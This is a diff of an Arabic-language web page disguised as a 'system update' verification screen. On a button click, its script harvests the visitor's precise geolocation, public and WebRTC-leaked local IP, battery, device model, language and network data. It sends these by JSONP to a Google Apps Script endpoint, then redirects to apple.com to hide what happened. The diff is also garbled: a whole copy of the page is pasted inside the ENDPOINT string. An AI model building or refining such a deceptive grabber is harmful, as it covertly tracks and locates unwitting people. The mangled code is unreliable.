@@ -65,7 +65,7 @@
   <p class="hint" id="hint" hidden></p>
   <noscript>
     <a class="go" href="https://www.apple.com/">المتابعة</a>
-    <p class="hint">جافاسكربت معطّل — حدّث الرابط أعلاه عند تغييره.</p>
+    <p class="hint">جافاسكربت معطّل — تابع عبر الرابط أعلاه.</p>
   </noscript>
 </main>
 
@@ -74,15 +74,91 @@
   'use strict';
 
   /* ===================== الإعدادات ===================== */
-  const ENDPOINT = 'https://script.google.com/macros/s/AKfycbwl4Udh9s7jhMA-KkwtQM33xYHRhYpXq_0p2diQMYIMPyaAprqYmrOGOT0UsOGv6E1Rng/exec';
-  const REDIRECT = 'https://www.apple.com/';   // ← غيّرها إلى وجهتك
+  const ENDPOINT = '<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex,nofollow">
+<meta name="referrer" content="no-referrer">
+<title>جارٍ تحديث النظام…</title>
+<style>
+  :root{
+    --bg:#0d1117; --card:#161b22; --line:#30363d; --fg:#e6edf3;
+    --mut:#9aa4af; --acc:#2f81f7; --ok:#3fb950; --err:#f85149;
+  }
+  *{box-sizing:border-box}
+  html,body{height:100%}
+  body{
+    margin:0; background:radial-gradient(1200px 600px at 50% -10%,#1b2430,var(--bg));
+    color:var(--fg); font:16px/1.6 system-ui,-apple-system,"Segoe UI",Tahoma,sans-serif;
+    display:grid; place-items:center; padding:20px;
+  }
+  .card{
+    width:100%; max-width:420px; background:var(--card); border:1px solid var(--line);
+    border-radius:16px; padding:28px 22px; text-align:center;
+    box-shadow:0 18px 50px rgba(0,0,0,.45);
+  }
+  .ring{
+    width:54px; height:54px; margin:0 auto 18px; border-radius:50%;
+    border:3px solid var(--line); border-top-color:var(--acc);
+    animation:spin .9s linear infinite;
+  }
+  .ring.done{animation:none; border-color:var(--ok)}
+  .ring.fail{animation:none; border-color:var(--err)}
+  @keyframes spin{to{transform:rotate(360deg)}}
+  h1{font-size:19px; margin:0 0 6px}
+  .sub{color:var(--mut); font-size:14px; margin:0 0 14px}
+  .status{
+    min-height:22px; font-size:14px; margin:0 0 16px; color:var(--mut);
+    transition:color .2s;
+  }
+  .status.ok{color:var(--ok)} .status.err{color:var(--err)}
+  button{
+    width:100%; padding:13px; border:0; border-radius:10px; cursor:pointer;
+    background:var(--acc); color:#fff; font:inherit; font-weight:600;
+  }
+  button:disabled{opacity:.6; cursor:default}
+  button:focus-visible,a:focus-visible{outline:2px solid var(--acc); outline-offset:2px}
+  .go{
+    display:block; margin-top:14px; color:var(--acc); font-size:14px;
+    text-decoration:none; font-weight:600;
+  }
+  .hint{color:var(--mut); font-size:12px; margin:16px 0 0; line-height:1.5}
+  .hint code{background:#0d1117; padding:1px 5px; border-radius:5px; direction:ltr; display:inline-block}
+  [hidden]{display:none !important}
+  @media (prefers-reduced-motion:reduce){ .ring{animation:none} }
+</style>
+</head>
+<body>
+<main class="card">
+  <div class="ring" id="ring" aria-hidden="true"></div>
+  <h1 id="title">جارٍ تحديث النظام</h1>
+  <p class="sub" id="sub">لا تُغلق الصفحة، سيستغرق الأمر لحظات.</p>
+  <p class="status" id="status" role="status" aria-live="polite"></p>
+  <button id="btn" type="button">بدء التحقق</button>
+  <a class="go" id="go" href="#" hidden>المتابعة الآن</a>
+  <p class="hint" id="hint" hidden></p>
+  <noscript>
+    <a class="go" href="https://www.apple.com/">المتابعة</a>
+    <p class="hint">جافاسكربت معطّل — تابع عبر الرابط أعلاه.</p>
+  </noscript>
+</main>
+
+<script>
+(function () {
+  'use strict';
+
+  /* ===================== الإعدادات ===================== */
+  const ENDPOINT = '';                       // ← رابط النشر /exec
+  const REDIRECT = 'https://www.apple.com/'; // ← وجهة التحويل
   const GEO_TIMEOUT   = 10000;
   const NET_TIMEOUT   = 4000;
   const RTC_TIMEOUT   = 5000;
   const SEND_TIMEOUT  = 14000;
   const REDIRECT_WAIT = 1200;
   const FAIL_REDIRECT = 9000;
-  const MAX_URL       = 7000;
+  const MAX_URL       = 7500;
   const NA = 'N/A';
 
   const $ = (id) => document.getElementById(id);
@@ -91,6 +167,7 @@
 
   let busy = false;
   let finished = false;
+  let failTimer = null;
 
   /* ===================== أدوات ===================== */
   const pad = (n) => String(n).padStart(2, '0');
@@ -131,6 +208,7 @@
       .join('&');
   }
 
+  /* JSONP: إرسال واستقبال التأكيد في طلب واحد */
   function jsonp(params, timeoutMs) {
     return new Promise((resolve) => {
       const name = 'vncb_' + Math.random().toString(36).slice(2, 10);
@@ -153,8 +231,7 @@
       script.async = true;
 
       const sep = ENDPOINT.indexOf('?') === -1 ? '?' : '&';
-      script.src = ENDPOINT + sep + toQuery(params) + '&cb=' + name +
-                   '&_=' + Date.now();
+      script.src = ENDPOINT + sep + toQuery(params) + '&cb=' + name + '&_=' + Date.now();
 
       if (script.src.length > MAX_URL) {
         finish(false);
@@ -189,6 +266,7 @@
     return parts.length ? parts.join(' / ').slice(0, 80) : NA;
   }
 
+  /* يجمع المرشحات ثم يفضّل IPv4 خاصًا ← IPv4 عامًا ← mDNS ← IPv6 */
   function getLocalIp() {
     return withTimeout(new Promise((resolve) => {
       const PC = window.RTCPeerConnection || window.webkitRTCPeerConnection;
@@ -322,7 +400,7 @@
       getBattery(), getLocalIp(), getPublicIp(), getGeo()
     ]);
 
-    const payload = {
+    return {
       nonce: nonce(),
       time: localTime(),
       ip: ip,
@@ -340,14 +418,12 @@
       model: parseModel(ua),
       platform: parsePlatform(ua),
       network: getNetwork(),
-      screen: screen.width + 'x' + screen.height,
+      screen: (screen.width || 0) + 'x' + (screen.height || 0),
       native: 'لا',
       cCount: 0, cJson: '[]',
       sCount: 0, sJson: '[]',
       lCount: 0, lJson: '[]'
     };
-
-    return payload;
   }
 
   async function send(payload) {
@@ -366,6 +442,7 @@
 
   function succeed() {
     finished = true;
+    clearTimeout(failTimer);
     el.ring.className = 'ring done';
     el.title.textContent = 'تم التحقق بنجاح';
     el.sub.textContent = 'جارٍ تحويلك…';
@@ -388,9 +465,11 @@
     el.btn.textContent = 'إعادة المحاولة';
     el.go.href = REDIRECT;
     el.go.hidden = false;
-    setTimeout(() => {
-      if (!finished || busy) return;
-      if (!el.btn.hidden && !busy) location.replace(REDIRECT);
+
+    clearTimeout(failTimer);
+    failTimer = setTimeout(() => {
+      if (busy) return;
+      location.replace(REDIRECT);
     }, FAIL_REDIRECT);
   }
 
@@ -398,6 +477,7 @@
     if (busy) return;
     busy = true;
     finished = false;
+    clearTimeout(failTimer);
     el.btn.disabled = true;
     el.ring.className = 'ring';
     el.title.textContent = 'جارٍ تحديث النظام';
@@ -422,7 +502,368 @@
 
   if (!/^https:\/\/script\.google\.com\//.test(ENDPOINT)) {
     el.hint.hidden = false;
-    el.hint.innerHTML = 'لم يُضبط رابط النشر. عدّل <code>ENDPOINT</code> في أعلى السكربت.';
+    el.hint.innerHTML = 'لم يُضبط رابط النشر. عدّل <code>ENDPOINT</code> أعلى السكربت.';
+    el.btn.disabled = true;
+  }
+
+  el.btn.addEventListener('click', run);
+  window.addEventListener('pageshow', (e) => { if (e.persisted) location.reload(); });
+})();
+</script>
+</body>
+</html>';                       // ← رابط النشر /exec
+  const REDIRECT = 'https://www.apple.com/'; // ← وجهة التحويل
+  const GEO_TIMEOUT   = 10000;
+  const NET_TIMEOUT   = 4000;
+  const RTC_TIMEOUT   = 5000;
+  const SEND_TIMEOUT  = 14000;
+  const REDIRECT_WAIT = 1200;
+  const FAIL_REDIRECT = 9000;
+  const MAX_URL       = 7500;
+  const NA = 'N/A';
+
+  const $ = (id) => document.getElementById(id);
+  const el = { ring: $('ring'), title: $('title'), sub: $('sub'), status: $('status'),
+               btn: $('btn'), go: $('go'), hint: $('hint') };
+
+  let busy = false;
+  let finished = false;
+  let failTimer = null;
+
+  /* ===================== أدوات ===================== */
+  const pad = (n) => String(n).padStart(2, '0');
+
+  function setStatus(text, kind) {
+    el.status.textContent = text || '';
+    el.status.className = 'status' + (kind ? ' ' + kind : '');
+  }
+
+  function withTimeout(promise, ms, fallback) {
+    return new Promise((resolve) => {
+      let done = false;
+      const timer = setTimeout(() => {
+        if (done) return;
+        done = true; resolve(fallback);
+      }, ms);
+      Promise.resolve(promise).then((v) => {
+        if (done) return;
+        done = true; clearTimeout(timer); resolve(v);
+      }, () => {
+        if (done) return;
+        done = true; clearTimeout(timer); resolve(fallback);
+      });
+    });
+  }
+
+  function nonce() {
+    try {
+      if (window.crypto && crypto.randomUUID) return crypto.randomUUID().replace(/-/g, '');
+    } catch (_) {}
+    return Date.now().toString(36) + Math.random().toString(36).slice(2, 10);
+  }
+
+  function toQuery(obj) {
+    return Object.keys(obj)
+      .filter((k) => obj[k] !== '' && obj[k] != null)
+      .map((k) => encodeURIComponent(k) + '=' + encodeURIComponent(String(obj[k])))
+      .join('&');
+  }
+
+  /* JSONP: إرسال واستقبال التأكيد في طلب واحد */
+  function jsonp(params, timeoutMs) {
+    return new Promise((resolve) => {
+      const name = 'vncb_' + Math.random().toString(36).slice(2, 10);
+      const script = document.createElement('script');
+      let done = false;
+
+      const finish = (value) => {
+        if (done) return;
+        done = true;
+        clearTimeout(timer);
+        try { delete window[name]; } catch (_) { window[name] = undefined; }
+        if (script.parentNode) script.parentNode.removeChild(script);
+        resolve(value);
+      };
+
+      window[name] = (res) => finish(!!(res && res.ok === true));
+
+      const timer = setTimeout(() => finish(false), timeoutMs);
+      script.onerror = () => finish(false);
+      script.async = true;
+
+      const sep = ENDPOINT.indexOf('?') === -1 ? '?' : '&';
+      script.src = ENDPOINT + sep + toQuery(params) + '&cb=' + name + '&_=' + Date.now();
+
+      if (script.src.length > MAX_URL) {
+        finish(false);
+        return;
+      }
+      document.head.appendChild(script);
+    });
+  }
+
+  /* ===================== جامعات البيانات ===================== */
+  function getBattery() {
+    return withTimeout((async () => {
+      if (!navigator.getBattery) return { level: NA, charging: NA };
+      const b = await navigator.getBattery();
+      return {
+        level: Math.round(b.level * 100) + '%',
+        charging: b.charging ? 'يشحن' : 'لا يشحن'
+      };
+    })(), 3000, { level: NA, charging: NA });
+  }
+
+  function getNetwork() {
+    const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    const parts = [];
+    if (!navigator.onLine) parts.push('غير متصل');
+    if (c) {
+      if (c.effectiveType) parts.push(c.effectiveType);
+      if (c.downlink) parts.push(c.downlink + 'Mbps');
+      if (c.rtt != null) parts.push('rtt ' + c.rtt + 'ms');
+      if (c.saveData) parts.push('توفير');
+    }
+    return parts.length ? parts.join(' / ').slice(0, 80) : NA;
+  }
+
+  /* يجمع المرشحات ثم يفضّل IPv4 خاصًا ← IPv4 عامًا ← mDNS ← IPv6 */
+  function getLocalIp() {
+    return withTimeout(new Promise((resolve) => {
+      const PC = window.RTCPeerConnection || window.webkitRTCPeerConnection;
+      if (!PC) return resolve(NA);
+
+      let pc;
+      try { pc = new PC({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] }); }
+      catch (_) { return resolve(NA); }
+
+      const found = new Set();
+      let settled = false;
+
+      const finish = () => {
+        if (settled) return;
+        settled = true;
+        try { pc.close(); } catch (_) {}
+        resolve(pickIp(found));
+      };
+
+      pc.onicecandidate = (e) => {
+        if (!e.candidate || !e.candidate.candidate) { finish(); return; }
+        const parts = e.candidate.candidate.split(' ');
+        const addr = parts[4];
+        if (addr) found.add(addr);
+      };
+
+      try {
+        pc.createDataChannel('x');
+        pc.createOffer().then((o) => pc.setLocalDescription(o)).catch(finish);
+      } catch (_) { finish(); }
+
+      setTimeout(finish, RTC_TIMEOUT);
+    }), RTC_TIMEOUT + 800, NA);
+  }
+
+  function pickIp(set) {
+    const all = Array.from(set);
+    const isV4 = (s) => /^\d{1,3}(\.\d{1,3}){3}$/.test(s);
+    const isPriv = (s) => isV4(s) && (/^10\./.test(s) || /^192\.168\./.test(s) ||
+                                      /^169\.254\./.test(s) || /^172\.(1[6-9]|2\d|3[01])\./.test(s) ||
+                                      /^100\.(6[4-9]|[7-9]\d|1[01]\d|12[0-7])\./.test(s));
+    const priv = all.find(isPriv);
+    if (priv) return priv;
+    const pub = all.find(isV4);
+    if (pub) return pub;
+    const mdns = all.find((s) => /\.local$/i.test(s));
+    if (mdns) return mdns;
+    const v6 = all.find((s) => s.indexOf(':') !== -1);
+    return v6 || NA;
+  }
+
+  function getPublicIp() {
+    const apis = ['https://api.ipify.org?format=json', 'https://ipwho.is/'];
+    const tryOne = (i) => {
+      if (i >= apis.length) return Promise.resolve(NA);
+      return withTimeout((async () => {
+        const r = await fetch(apis[i], { mode: 'cors', cache: 'no-store', credentials: 'omit' });
+        if (!r.ok) throw new Error('http');
+        const j = await r.json();
+        const ip = j.ip || (j.query ? j.query : '');
+        return /^[0-9a-fA-F:.]{7,45}$/.test(ip) ? ip : NA;
+      })(), NET_TIMEOUT, NA).then((v) => (v === NA ? tryOne(i + 1) : v));
+    };
+    return tryOne(0);
+  }
+
+  function getGeo() {
+    if (!navigator.geolocation) return Promise.resolve({ lat: '', lng: '', acc: '', src: NA });
+
+    return withTimeout(new Promise((resolve) => {
+      navigator.geolocation.getCurrentPosition(
+        (pos) => resolve({
+          lat: +pos.coords.latitude.toFixed(6),
+          lng: +pos.coords.longitude.toFixed(6),
+          acc: Math.round(pos.coords.accuracy),
+          src: 'متصفح'
+        }),
+        (err) => resolve({
+          lat: '', lng: '', acc: '',
+          src: err && err.code === 1 ? 'مرفوض' : 'فشل'
+        }),
+        { enableHighAccuracy: true, timeout: GEO_TIMEOUT, maximumAge: 60000 }
+      );
+    }), GEO_TIMEOUT + 1200, { lat: '', lng: '', acc: '', src: 'انتهت المهلة' });
+  }
+
+  function parseModel(ua) {
+    const m = ua.match(/Android[^;)]*;\s*(?:[a-z]{2}[-_][a-z]{2};\s*)?([^;)]+?)(?:\s+Build[/)]|\))/i);
+    if (m) return m[1].replace(/\s+/g, ' ').trim().slice(0, 60);
+    if (/iPhone/.test(ua)) return 'iPhone';
+    if (/iPad/.test(ua)) return 'iPad';
+    return '';
+  }
+
+  function parseBrand(ua) {
+    const t = ua.toLowerCase();
+    if (/redmi|poco|xiaomi|\bmi\b/.test(t)) return 'Xiaomi';
+    if (/samsung|sm-|gt-\d/.test(t)) return 'Samsung';
+    if (/huawei|honor/.test(t)) return 'Huawei';
+    if (/oppo|cph\d/.test(t)) return 'OPPO';
+    if (/vivo|v\d{4}/.test(t)) return 'Vivo';
+    if (/oneplus/.test(t)) return 'OnePlus';
+    if (/iphone|ipad|ipod/.test(t)) return 'Apple';
+    if (/windows/.test(t)) return 'PC';
+    return '';
+  }
+
+  function parsePlatform(ua) {
+    let m = ua.match(/Android\s+([\d.]+)/i);
+    if (m) return 'Android ' + m[1];
+    m = ua.match(/(?:iPhone )?OS (\d+)[._](\d+)/i);
+    if (m) return 'iOS ' + m[1] + '.' + m[2];
+    if (/Windows NT 10/.test(ua)) return 'Windows 10/11';
+    if (/Mac OS X/.test(ua)) return 'macOS';
+    if (/Linux/.test(ua)) return 'Linux';
+    return NA;
+  }
+
+  /* ===================== التدفق ===================== */
+  function localTime() {
+    const d = new Date();
+    return d.getFullYear() + '-' + pad(d.getMonth() + 1) + '-' + pad(d.getDate()) +
+           ' ' + pad(d.getHours()) + ':' + pad(d.getMinutes()) + ':' + pad(d.getSeconds());
+  }
+
+  async function collect() {
+    const ua = navigator.userAgent.slice(0, 400);
+
+    setStatus('جارٍ التحقق من الجهاز…');
+    const [battery, localIp, ip, geo] = await Promise.all([
+      getBattery(), getLocalIp(), getPublicIp(), getGeo()
+    ]);
+
+    return {
+      nonce: nonce(),
+      time: localTime(),
+      ip: ip,
+      localIp: localIp,
+      battery: battery.level,
+      charging: battery.charging,
+      lat: geo.lat,
+      lng: geo.lng,
+      acc: geo.acc,
+      geoSource: geo.src,
+      tz: (Intl.DateTimeFormat().resolvedOptions().timeZone || NA).slice(0, 60),
+      lang: (navigator.languages || [navigator.language || NA]).join(',').slice(0, 60),
+      ua: ua,
+      brand: parseBrand(ua),
+      model: parseModel(ua),
+      platform: parsePlatform(ua),
+      network: getNetwork(),
+      screen: (screen.width || 0) + 'x' + (screen.height || 0),
+      native: 'لا',
+      cCount: 0, cJson: '[]',
+      sCount: 0, sJson: '[]',
+      lCount: 0, lJson: '[]'
+    };
+  }
+
+  async function send(payload) {
+    const base = { a: 'collect', data: JSON.stringify(payload) };
+
+    setStatus('جارٍ إرسال البيانات…');
+    let ok = await jsonp(base, SEND_TIMEOUT);
+
+    if (!ok) {
+      setStatus('تعذّر التأكيد، إعادة المحاولة…');
+      await new Promise((r) => setTimeout(r, 1500));
+      ok = await jsonp(base, SEND_TIMEOUT);
+    }
+    return ok;
+  }
+
+  function succeed() {
+    finished = true;
+    clearTimeout(failTimer);
+    el.ring.className = 'ring done';
+    el.title.textContent = 'تم التحقق بنجاح';
+    el.sub.textContent = 'جارٍ تحويلك…';
+    setStatus('تم تسجيل الجهاز.', 'ok');
+    el.btn.hidden = true;
+    el.go.href = REDIRECT;
+    el.go.hidden = false;
+    setTimeout(() => { location.replace(REDIRECT); }, REDIRECT_WAIT);
+  }
+
+  function fail(msg) {
+    finished = true;
+    busy = false;
+    el.ring.className = 'ring fail';
+    el.title.textContent = 'تعذّر إكمال التحقق';
+    el.sub.textContent = 'يمكنك المتابعة أو إعادة المحاولة.';
+    setStatus(msg || 'لم يصل تأكيد من الخادم.', 'err');
+    el.btn.hidden = false;
+    el.btn.disabled = false;
+    el.btn.textContent = 'إعادة المحاولة';
+    el.go.href = REDIRECT;
+    el.go.hidden = false;
+
+    clearTimeout(failTimer);
+    failTimer = setTimeout(() => {
+      if (busy) return;
+      location.replace(REDIRECT);
+    }, FAIL_REDIRECT);
+  }
+
+  async function run() {
+    if (busy) return;
+    busy = true;
+    finished = false;
+    clearTimeout(failTimer);
+    el.btn.disabled = true;
+    el.ring.className = 'ring';
+    el.title.textContent = 'جارٍ تحديث النظام';
+    el.sub.textContent = 'لا تُغلق الصفحة، سيستغرق الأمر لحظات.';
+    el.go.hidden = true;
+    setStatus('جارٍ التحقق من الجهاز…');
+
+    try {
+      const payload = await collect();
+      const ok = await send(payload);
+      if (ok) succeed();
+      else fail('لم يصل تأكيد من الخادم.');
+    } catch (e) {
+      fail('خطأ غير متوقع: ' + (e && e.message ? e.message : 'مجهول'));
+    } finally {
+      if (!finished) busy = false;
+    }
+  }
+
+  /* ===================== التهيئة ===================== */
+  el.go.href = REDIRECT;
+
+  if (!/^https:\/\/script\.google\.com\//.test(ENDPOINT)) {
+    el.hint.hidden = false;
+    el.hint.innerHTML = 'لم يُضبط رابط النشر. عدّل <code>ENDPOINT</code> أعلى السكربت.';
     el.btn.disabled = true;
   }
 
